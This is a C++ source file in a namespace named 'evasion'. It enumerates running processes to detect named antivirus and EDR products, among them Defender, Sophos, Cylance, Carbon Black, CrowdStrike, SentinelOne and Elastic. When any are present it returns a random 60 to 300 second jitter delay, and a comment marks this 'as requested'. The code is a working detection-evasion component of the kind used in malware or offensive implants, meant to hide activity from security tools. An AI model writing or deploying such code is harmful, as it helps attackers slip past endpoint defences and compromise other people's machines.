#include "Detection.h"
#include <windows.h>
#include <tlhelp32.h>
#include <algorithm>
#include <random>
#include <cwctype>

namespace evasion {

bool Detection::IsAVPresent() {
    std::vector<std::wstring> avProcesses = {
        L"MsMpEng.exe", L"MpCmdRun.exe",
        L"SavService.exe", L"SAVAdminService.exe",
        L"CylanceSvc.exe", L"CylanceUI.exe"
    };

    for (const auto& av : avProcesses) {
        if (IsProcessRunning(av)) return true;
    }
    return false;
}

bool Detection::IsEDRPresent() {
    std::vector<std::wstring> edrProcesses = {
        L"CbSvc.exe", L"CbDefense.exe",
        L"csfalconservice.exe", L"SentinelAgent.exe",
        L"elastic-endpoint.exe"
    };

    for (const auto& edr : edrProcesses) {
        if (IsProcessRunning(edr)) return true;
    }
    return false;
}

int Detection::GetJitterDelay() {
    if (IsEDRPresent() || IsAVPresent()) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(60, 300); // 60-300s jitter as requested
        return dis(gen);
    }
    return 0;
}

bool Detection::IsProcessRunning(const std::wstring& processName) {
    bool found = false;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                std::wstring currentProcess = pe.szExeFile;
                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
                std::wstring targetProcess = processName;
                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });

                if (currentProcess == targetProcess) {
                    found = true;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return found;
}

} // namespace evasion
